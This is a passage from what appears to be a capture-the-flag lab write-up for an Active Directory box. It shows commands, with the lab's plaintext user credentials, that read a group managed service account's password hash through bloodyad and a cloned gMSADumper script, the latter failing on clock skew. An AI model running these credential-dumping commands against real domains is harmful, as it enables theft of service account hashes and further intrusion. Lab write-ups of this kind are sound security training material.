
This ACL allows us to retrieve the NT Hash of an user.

---

```
bloodyad --host 10.129.46.115 -d intelligence.htb -u ted.graves -p 'Mr.Teddy' get object 'svc_int$' --attr msDS-ManagedPassword
```

---

or with custom python tool

```
git clone https://github.com/timothyericsson/gMSADumper-ng.git
```

Started up and activated virtual environment

```
python3 -m venv myenv
source myenv/bin/activate
```

Download requirements

```
pip install -r requirements.txt
```

Executed the script. But it error'd out due to clock skew error.

```
python3 gMSADumper-ng.py -u Ted.Graves -p 'Mr.Teddy' -d intelligence.htb
```
